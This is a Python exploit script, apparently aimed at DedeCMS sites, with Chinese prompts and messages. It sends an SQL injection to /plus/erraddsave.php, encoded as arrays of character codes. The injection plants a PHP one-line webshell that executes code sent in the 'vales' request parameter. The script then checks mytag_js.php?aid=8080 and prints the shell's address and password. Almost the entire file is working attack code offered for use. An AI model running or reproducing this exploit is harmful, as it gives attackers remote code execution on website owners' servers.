#__author__ = 'techxsh'
#encoding: utf-8
#shell: [url=http://www.xxx.com/plus/mytag_js.php?aid=8080]http://www.xxx.com/plus/mytag_js.php?aid=8080[/url]  vales
import urllib.parse, urllib.request, os
url = input("输入格式类似[url=http://www.xxx.com]www.xxx.com[/url]的url：")
posturl = "http://"+url+"/plus/erraddsave.php"
geturl = "http://"+url+"/plus/mytag_js.php"
geturl2 = "http://"+url+"/plus/mytag_js.php?aid=8080&nocache=90sec"
getheader = {
    "Connection": "Keep-Alive",
    "Content-Type": "text/plain; Charset=UTF-8",
    "Accept": "*/*",
    "Cookie": "xxxx;",
    "User-Agent": "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
    "tijiao": "90sec",
    #"Content-Length": "1959",
    "Host": url
}
urlget = urllib.request.Request(geturl, headers=getheader)
try:
    urlopen = urllib.request.urlopen(urlget).read()
    print("200 OK")
    #print(urlopen)
except urllib.request.HTTPError as err:
    print("不存在可利用的文件")
    exit()

postheader = {
    "Connection": "Keep-Alive",
    "Content-Type": "application/x-www-form-urlencoded;",
    "Charset": "UTF-8",
    "Accept": "*/*",
    "Cookie": "xxxx;",
    "User-Agent": "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
    "tijiao": "90sec",
    "Content-Length": "1430",
    "Host": url
}
postdata1 = "dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=56&arrs2[]=48&arrs2[]=56&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=101&arrs2[]=115&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0"
postdata1 = postdata1.encode("utf-8")
urlreq1 = urllib.request.Request(posturl, postdata1, postheader)
opener = urllib.request.build_opener()
urlpost1 = opener.open(urlreq1).read()
#print(urlpost1.decode("gbk"))

urlget2 = urllib.request.Request(geturl2, headers=getheader)
try:
    urlopen2 = urllib.request.urlopen(urlget2).read()
    print("200 OK \n")
    #print(urlopen2)
    if len(urlopen2) > 0:
        print("一句话地址：http://"+url+"/plus/mytag_js.php?aid=8080  密码：vales")
    else:
        print("应该是打补丁了")
except urllib.request.HTTPError as err:
    print("利用失败")
os.system("pause")